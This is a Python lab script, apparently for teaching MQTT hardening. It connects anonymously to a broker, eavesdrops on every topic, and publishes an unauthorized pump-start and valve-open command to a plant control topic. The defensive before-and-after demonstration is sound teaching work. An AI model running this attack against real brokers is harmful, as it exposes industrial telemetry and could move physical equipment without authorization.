#!/usr/bin/env python3
"""attacker.py -- demonstrates what an open MQTT broker allows.

Mirrors the rogue host from the capture. In sequence it:
  1. connects with NO credentials (tests allow_anonymous),
  2. subscribes to '#' (every topic) and prints whatever leaks,
  3. publishes an unauthorized command to plant/tank1/command.

Run against the INSECURE broker and it succeeds; run it again after you harden
the broker (allow_anonymous false + password_file + acl_file) and watch it fail.
For classroom/lab use against systems you own.

Env: BROKER, PORT.
"""
import os, time, threading
import paho.mqtt.client as mqtt

BROKER = os.environ.get("BROKER", "localhost")
PORT = int(os.environ.get("PORT", "1883"))
seen = []


def make_client(cid):
    try:
        return mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id=cid, clean_session=True)
    except (AttributeError, TypeError):
        return mqtt.Client(client_id=cid, clean_session=True)


def on_connect(c, u, flags, rc, *a):
    if rc == 0:
        print("[attacker] CONNECT accepted with NO credentials -> broker allows anonymous", flush=True)
        c.subscribe("#", qos=0)
        print("[attacker] subscribed to '#' (all topics)", flush=True)
    else:
        print(f"[attacker] CONNECT refused rc={rc} -> broker requires auth (good!)", flush=True)


def on_message(c, u, msg):
    line = f"[attacker] eavesdropped {msg.topic}: {msg.payload.decode(errors='replace')}"
    print(line, flush=True)
    seen.append(line)


def main():
    c = make_client("mqtt-explorer-x")   # note: no username_pw_set()
    c.on_connect = on_connect
    c.on_message = on_message
    try:
        c.connect(BROKER, PORT, keepalive=60)
    except Exception as e:
        print(f"[attacker] connection error: {e}", flush=True)
        return
    c.loop_start()
    time.sleep(5)  # eavesdrop for a few seconds
    info = c.publish("plant/tank1/command",
                     '{"actuator":"pump1","cmd":"START","valve":"open"}', qos=0)
    info.wait_for_publish()
    print("[attacker] published unauthorized command to plant/tank1/command", flush=True)
    time.sleep(1)
    c.loop_stop()
    c.disconnect()
    print(f"[attacker] done. eavesdropped {len(seen)} messages.", flush=True)


if __name__ == "__main__":
    main()
